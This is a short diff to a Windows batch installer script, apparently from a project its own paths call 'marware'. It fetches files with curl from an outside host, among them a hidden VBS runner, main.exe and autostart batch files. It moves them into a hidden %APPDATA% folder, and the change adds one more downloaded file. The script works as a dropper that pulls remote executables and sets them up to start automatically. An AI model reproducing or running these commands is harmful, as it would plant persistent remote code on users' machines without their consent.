@@ -11,8 +11,10 @@ curl -O http://harimtim.de/marware/1.1/run_main_hidden.vbs
 curl -O http://harimtim.de/marware/1.1/main.exe
 curl -O http://harimtim.de/marware/1.1/autostart.bat
 curl -O http://harimtim.de/marware/1.1/starter.bat
+curl -O http://harimtim.de/marware/1.1/input_left.txt
 
 move starter.bat "%APPDATA%\marware"
+move input_left.txt "%APPDATA%\marware"
 move icon.ico "%APPDATA%\marware"
 move show1.bat "%APPDATA%\marware"
 move show2.bat "%APPDATA%\marware"
